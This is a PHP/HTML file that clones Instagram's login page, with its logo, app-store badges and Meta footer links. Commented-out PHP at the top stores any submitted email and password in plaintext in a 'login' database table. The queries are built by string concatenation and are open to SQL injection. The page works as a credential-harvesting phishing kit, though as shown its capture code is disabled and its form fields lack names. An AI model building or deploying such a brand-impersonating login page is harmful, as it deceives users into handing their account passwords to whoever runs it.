<!--  <?php
	/*include('postw.php');
	if(isset($_POST['submit']))
	{
		$email = $_POST['email'];
		$password = $_POST['password'];
	}
	
	$query = "INSERT INTO `login`(`email`, `password`) VALUES ('$email','$password')";
	mysqli_query($conn,$query);
	 
	$result = mysqli_query($conn,$query);*/
?> 
<?php
	/*include('connection.php');
	$email = $_POST['email'];
	$password = $_POST['password'];

	$query = "INSERT INTO `login`(`email`, `password`) VALUES ('$email','$password')";
	mysqli_query($conn,$query);*/
?> -->

<!-- <?php
	//include('connection.php');
	//$email = $_GET['email'];
	//$password = $_GET['password'];

	//$query="INSERT INTO `login` (`email`, `password`) VALUES ('$email','$password')";
	//mysqli_query($conn,$query);
?> -->

<!DOCTYPE html>
<html>
<head>
	<title>Instagram login</title>
	<link rel="icon"  href="assets/images/insta2.png">
	<meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet"  href="D:\xampp\htdocs\instagram\assets\css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
  
</head>
<body>
	<div class="container">
		<div class="row">
			<div class="mx-auto col-10 col-md-8 col-lg-4 pt-3">
				<form method="get">
				<div class="card p-3">
					<div class="card-body">	
						<img class="card-img-top img-responsive center-block wrapper mb-3" src="assets/images/insta.png">
						<input type="email" class="form-control form-control-sm mb-2" placeholder="Phone number, username, or email" id="email">
						<input type="password" class="form-control form-control-sm" placeholder="Password" id="password">
						<br>
    					<input type="checkbox" class="form-check-input ml-2" value="">&nbsp 
    					<label class="form-check-label ml-3">Save login info</label>
						<div class="row pt-3">
							<div class="col-12 text-center">
								<button type="submit" class="btn btn-info btn-sm w-100" style="border-radius: 9px;"><b>LOG IN</b></button>
							</div>
						</div>
						<hr>
						<h6 class="text-center" id="clr"><img src="assets/images/fblogo.png" class="pr-2" >Log in with facebook</h6>
							<p class="text-center"><a href="forgotpass.php" target="blank" class="text-dark">Forgot Password?</p>
					</div>
				</div>
				<br>
				<div class="row">
					<div class="col-md-12 col-sm-12 col-lg-12 col-12">
						<div class="card">
							<div class="card-body">
								<p class="text-center">Do You Have An Account? <a href="signup.php"  style="font-size: 15px;"><b>Sign up</b></a></p>
							</div>
						</div>
					</div>
				</div>
				<p class="text-center pb-2 pt-3">GET THE APP</p>
					
					<div class="row ">
      					<div class="col">
      						<a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DACB8E88E-7A47-4F23-8678-EF34BC4715C0%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge" target="_blank">
       						<img class="img-fluid" src="assets/images/play2.png">
      					</div>
    					<div class="col">
    						<a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C1920%2C1020" target="_blank">
        					<img src="assets/images/micro2-.png" alt="sry" class="img-fluid">
      					</div>
    				</div>
				<br>
				</form>		
		    </div>
		</div>
	</div>
	<footer>
		<div class="row">
			<div class="col-sm-12 col-md-12 col-lg-12 col-12">
				<div class="text-center p-5" style="font-size: 12px;">
					<a href="https://about.meta.com/" class="pr-2 text-secondary">Meta</a>
					<a href="https://about.instagram.com/" class="pr-2 text-secondary">About</a>
					<a href="https://about.instagram.com/blog/" class="pr-2 text-secondary">Blog</a>
					<a href="/about/jobs/" class="pr-2 text-secondary">Jobs</a>
					<a href="https://help.instagram.com/" class="pr-2 text-secondary">Help</a>
					<a href="https://developers.facebook.com/docs/instagram" class="pr-2 text-secondary">API</a>
					<a href="/legal/privacy/" class="pr-2 text-secondary">Privacy</a>
					<a href="/legal/terms/" class="pr-2 text-secondary">Terms</a>
					<a href="/directory/profiles/" class="pr-2 text-secondary">Top Accounts</a>
					<a href="/explore/locations/" class="pr-2 text-secondary">Locations</a>
					<a href="/web/lite/" class="pr-2 text-secondary">Instagram Lite</a>
					<a href="https://www.facebook.com/help/instagram/261704639352628" class="text-secondary pr-2">Contact Uploading & Non-Users</a>
					<a href="https://about.meta.com/technologies/meta-verified/" class="text-secondary pr-2">Meta Verified</a>
						<div class="text-center pt-4 text-secondary" style="font-size: 11px;">
							© 2023 Instagram from Meta
						</div>
				</div>
			</div>
		</div>		
	</footer>
</body>
</html>